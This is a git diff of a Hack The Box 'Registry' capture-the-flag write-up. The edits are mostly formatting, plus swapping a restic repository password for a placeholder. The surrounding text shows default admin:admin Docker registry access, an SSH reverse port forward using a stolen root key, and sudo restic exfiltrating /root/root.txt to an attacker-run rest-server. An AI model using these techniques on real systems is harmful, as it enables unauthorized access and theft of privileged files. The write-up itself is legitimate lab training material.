@@ -172,7 +172,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 21.21 seconds
 ```
 
-TCP 80 is accessible as well as TCP 443. TCP 443's certificate gives us some good information in how to approach this one, as well as the CN being docker.registry.htb, which is also a clue. It might be related to Docker Registries. Let's try to enumerate the directories, but first let's add this into the hosts file as well.
+TCP 80 is accessible as well as TCP 443. TCP 443's certificate gives us some good information in how to approach this one, as well as the CN being docker.registry.htb, which is also a clue. It might be related to Docker Registries.
+
+
+Let's try to enumerate the directories, but first let's add this into the hosts file as well.
 
 
 ### GOBUSTER
@@ -204,6 +207,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 After running gobuster, we found a /v2 directory, which seems to be related to docker registry api. According to the Docker API Documentation, if a 401 Unauthorized is returned, it is related to authentication not being handled properly (well something like that); in other words, accessing it requires you to provide credentials.
 
 When trying it on the browser it prompts for authentication which seems to be using a default admin:admin credentials but only a empty json response comes up.
+
 Looks like we need to do some research on Docker APIs and there is also a good document available on how to hack on Docker APIs and interact with them (see the resources provided).
 
 After interacting with Docker API a little, we find the repositories, tags, and  list of blobs which are important.
@@ -785,7 +789,7 @@ Having done this, if we try to run the backup command, we cannot connect to the 
 
 At this point, we could also attempt to do SSH Remote Port Forwarding to bind a new service to registry.htb from a **NEW** terminal window:
 
-**SYNTAX:** ssh -R RemotePort:localhost:RestPort -i bolt_id_rsa bolt@registry.htb
+**SYNTAX:** *ssh -R RemotePort:localhost:RestPort -i bolt_id_rsa bolt@registry.htb*
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ ssh -R 61234:localhost:8000 -i /home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/id_rsa bolt@registry.htb
 
@@ -828,7 +832,7 @@ As TCP 61234 is now being used by registry.htb, rest-server is running on TCP 80
 ```
 www-data@bolt:~/html/bolt/theme$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:61234/ /root/root.txt
 <ckup -r rest:http://127.0.0.1:61234/ /root/root.txt
-enter password for repository: QWerty1234@@
+enter password for repository: <rest_repo_passwd>
 
 password is correct
 found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
